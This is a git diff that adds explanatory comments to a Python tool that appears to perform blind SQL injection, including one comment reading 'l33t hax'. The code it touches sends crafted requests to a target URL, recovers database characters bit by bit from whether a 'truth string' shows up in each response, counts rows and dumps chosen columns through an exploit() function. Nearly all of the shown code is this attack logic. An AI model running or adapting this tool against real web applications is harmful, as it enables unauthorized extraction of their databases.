@@ -13,8 +13,10 @@ options = {
 	"truth_string" : ""
 }
 
+# Here we store our dumped rows.
 dump = []
 
+# Fix the supplied target so requests doesn't complain.
 def fix_host(host):
     if ((not host.startswith("http://")) and (not host.startswith("https://"))):
         host = "http://" + host
@@ -26,6 +28,7 @@ def request(target):
     headers = {"user-agent" : options["user_agent"]}
     return requests.get(target, headers=headers, cookies=options["cookies"], allow_redirects=bool(options["follow_redirections"])).text
 
+# Grab the number of rows that we have to dump.
 def getNumberOfRows():
     count = 1
     s = ''
@@ -39,24 +42,26 @@ def getNumberOfRows():
             s += str(char)
             count += 1
 
+# Here we actually calculate a character.
 def getChar(target):
     otarget = target
     byte = ''
     for x in range(8):
         target = otarget
         next_if_set = int(byte+'1', 2)
-        target = target.replace('{shift}', str(7-x))
+        target = target.replace('{shift}', str(7-x)) # 7-x is the shift, based on the current bit we're calculating.
         target = target.replace('{result}', str(next_if_set))
         response = request(target)
         if options['truth_string'] in response:
             byte += '1'
         else:
             byte += '0'
-    if byte == '00000000':
+    if byte == '00000000': # If it returned this, then we've gone past the length of what we're dumping.
         return 1
     else:
         return chr(int(byte, 2))
-		
+
+# l33t hax	
 def exploit():
     options["target"] = fix_host(options["target"])
     columns = options['columns'].split(',')
